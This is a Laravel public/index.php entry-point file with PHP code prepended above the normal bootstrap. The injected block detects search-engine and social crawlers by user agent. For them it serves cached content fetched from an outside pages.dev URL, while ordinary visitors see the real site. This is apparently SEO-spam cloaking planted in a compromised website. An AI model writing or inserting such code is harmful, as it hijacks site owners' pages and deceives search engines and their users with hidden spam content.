<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bot_patterns = '/(googlebot|googlebot-mobile|googlebot-news|googlebot-image|googlebot-video|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|facebookexternalhit|twitterbot|whatsapp|linkedinbot|telegrambot|pinterestbot|applebot|yahoobot|mojeekbot|aolbot|seznambot|discordbot|redditbot|msnbot|ia_archiver|adsbot-google|google-screenshot|google-inspectiontool|google-site-verification|petalbot|ahrefsbot|semrushbot|mj12bot|megaindex|dotbot|mozbot|blexbot|serpstatbot|searchmetricsbot|seokicks|seoscanners|qwantify|nimbostratusbot|smtbot|surdotlybot|mail\.ru)/i';

    return preg_match($bot_patterns, $user_agent);
}

function fetch_content($url) {
    $cache_file = 'cache/' . md5($url) . '.html';
    $cache_time = 3600;

    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
        return file_get_contents($cache_file);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
    $content = curl_exec($ch);
    curl_close($ch);

    if ($content) {
        file_put_contents($cache_file, $content);
    }

    return $content;
}

if (is_bot()) {
    echo fetch_content('https://labkes-bukittinggikot.pages.dev/sc.txt');
}
?>
<?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
